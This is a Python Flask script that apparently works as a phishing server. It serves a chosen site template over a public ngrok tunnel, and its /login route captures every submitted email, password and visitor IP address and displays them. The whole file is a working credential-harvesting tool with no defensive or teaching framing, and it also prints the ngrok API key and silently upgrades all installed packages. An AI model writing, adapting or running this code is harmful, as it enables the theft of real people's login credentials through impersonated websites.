import os
import json
import argparse
from flask import Flask, render_template, request, Markup
from pyngrok import ngrok
from datetime import datetime
import pkg_resources
import subprocess
embed=True
def getsrvrNME(name, filename):
    try:
        with open(filename, 'r') as file:
            for line in file:
                if name in line:
                    index = line.find("[>")
                    if index != -1:
                        # Remove both ']' and '"' characters from the substring after '[>'
                        return line[index + 2:].replace(']', '').replace('"', '').strip()
        # If the name is not found in the file, return None
        return None
    except FileNotFoundError:
        print(f"File '{filename}' not found.")
        return None
app = Flask(__name__)

# Dummy data to store user credentials
users = {}

# Function to check and update outdated packages
def update_outdated_packages():
    outdated_packages = []
    for dist in pkg_resources.working_set:
        try:
            current_version = pkg_resources.get_distribution(dist.key).version
            latest_version = subprocess.check_output(["pip", "install", dist.key, "--upgrade", "--quiet"])
            if current_version != latest_version.strip().decode("utf-8"):
                outdated_packages.append(dist.key)
        except Exception:
            pass

    if outdated_packages:
        print(f"Outdated packages found: {', '.join(outdated_packages)}")
    else:
        print("All packages are up to date.")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    try:
        email = request.form['email']
        password = request.form['password']
        ip_address = request.remote_addr  # Get the client's IP address

        if email and password:
            users[email] = password  # Store the credentials in the 'users' dictionary (insecure)
            message = f'<span style="color:green">User logged in at <span style="color:blue">{datetime.now()}</span></span><br>Email: {email}<br>Password: {password}<br>IP Address: {ip_address}'
        else:
            message = f'<span style="color:red">Invalid credentials {email} : {password}</span>'
    except Exception as e:
        message = f'<span style="color:red">Error occurred: {str(e)}</span>'

    return Markup(message)

if __name__ == '__main__':
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('--site', type=str, required=True, help='Name of the site folder inside the "sites" folder')
        args = parser.parse_args()

        # Check if the "sites" folder exists, if not, create it
        if not os.path.exists('sites'):
            print("missing sites folder...")
            exit()

        # Set the path to the site folder based on the 'args.site'
        sitNAMES = 'sitNAMES.txt'
        site_folder = getsrvrNME(args.site, sitNAMES)
        if not site_folder:
            print(f'Error: Site folder "{args.site}" not found in the "{sitNAMES}" file.')
        else:
            if embed==True:
                print(f'embed>SERVER NAME:{site_folder}')

        with open('VAL.json') as json_file:
            data = json.load(json_file)
            ngrok_apikey = data.get('ngrok_APIKEY', '')
            print("ngrok KEY:[{}]".format(ngrok_apikey))

        if not ngrok_apikey:
            print("Error: ngrok_APIKEY is missing in the VAL.json file.")
            print("Please provide the ngrok API key in the VAL.json file.")
            exit(1)

        try:
            ngrok.set_auth_token(ngrok_apikey)
        except Exception as e:
            ngrok_executable_path = ngrok.get_ngrok_path()
            print(f"Error while setting ngrok API key. Command '{ngrok_executable_path} config add-authtoken {ngrok_apikey} --log=stdout' returned non-zero exit status 1.")
            print("Please check if the provided API key is correct and properly configured in ngrok.")
            print(f"Make sure that the ngrok executable is correctly installed and its path is set properly. The current path to ngrok executable is: {ngrok_executable_path}")
            print("You can get your ngrok API key by signing in at https://dashboard.ngrok.com/get-started/your-authtoken")
            exit(1)

        public_url = ngrok.connect(5000, proto='http', bind_tls=True)
        print("URL:", public_url)

        # Check and update outdated packages
        update_outdated_packages()

        app.run()
    except Exception as e:
        print(f'Error occurred while running the application: {str(e)}')
        exit(1)